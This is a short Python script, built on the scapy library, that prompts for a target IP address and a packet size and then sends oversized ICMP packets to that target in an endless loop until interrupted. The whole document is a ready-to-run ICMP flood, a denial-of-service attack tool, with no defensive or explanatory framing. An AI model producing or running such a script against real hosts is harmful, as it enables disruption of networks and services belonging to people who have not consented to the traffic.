from scapy.all import *
import time

# Get user input
target_ip = input("Enter the target IP address: ")  # Target IP address
packet_size = int(input("Enter the packet size (in bytes): "))  # Packet size in bytes

# Create the ICMP packet
packet = IP(dst=target_ip)/ICMP()/("X" * packet_size)

# Send packets continuously
print(f"Sending packets to {target_ip} with size {packet_size} bytes...")
try:
    send(packet, loop=1, verbose=0)  # Send packets continuously
except KeyboardInterrupt:
    print("\nPacket sending stopped by the user.")